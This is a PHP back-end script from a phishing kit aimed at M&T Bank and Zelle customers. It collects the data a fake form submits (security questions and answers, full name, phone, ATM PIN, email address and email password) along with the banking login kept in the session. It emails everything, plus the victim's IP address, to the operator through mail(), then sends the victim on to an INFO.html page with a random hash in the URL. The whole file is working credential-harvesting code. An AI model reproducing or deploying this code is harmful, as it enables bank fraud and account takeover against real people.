<?php
session_start();

include 'Email.php';
$_SESSION['Q1'] = $_POST['Q1'];
$_SESSION['A1'] = $_POST['A1'];
$_SESSION['Q2'] = $_POST['Q2'];
$_SESSION['A2'] = $_POST['A2'];
$_SESSION['Q3'] = $_POST['Q3'];
$_SESSION['A3'] = $_POST['A3'];
$_SESSION['fname'] = $_POST['fname'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['pin'] = $_POST['pin'];
$_SESSION['mail'] = $_POST['mail'];
$_SESSION['pass'] = $_POST['pass'];

$ip = getenv("REMOTE_ADDR");

$message .= "--------------[ MTB ]--------------------\n";
$message .= "User     : ".$_SESSION['userId']."\n";
$message .= "Password : ".$_SESSION['Passcode']."\n";
$message .= "--------------[ MTB ]---------------------\n";
$message .= "Question 1     : ".$_SESSION['Q1']."\n";
$message .= "Answer 1       : ".$_SESSION['A1']."\n";
$message .= "Question 2     : ".$_SESSION['Q2']."\n";
$message .= "Answer 2       : ".$_SESSION['A2']."\n";
$message .= "Question 3     : ".$_SESSION['Q3']."\n";
$message .= "Answer 3       : ".$_SESSION['A3']."\n";
$message .= "Full Name      : ".$_SESSION['fname']."\n";
$message .= "Phone Number   : ".$_SESSION['phone']."\n";
$message .= "ATM PIN        : ".$_SESSION['pin']."\n";
$message .= "--------------[ SYCHO ]---------------------\n";
$message .= "Email Address  : ".$_SESSION['mail']."\n";
$message .= "Email Password : ".$_SESSION['pass']."\n";
$message .= "--------------[ ZEBY ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ SYCHO ]--------------------\n";
$subject = "ZELLE|MTB  $ip";
$headers = "From: BLESSING <email@info.com>";
mail($SEND,$subject,$message,$headers);



$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$Logon="INFO.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>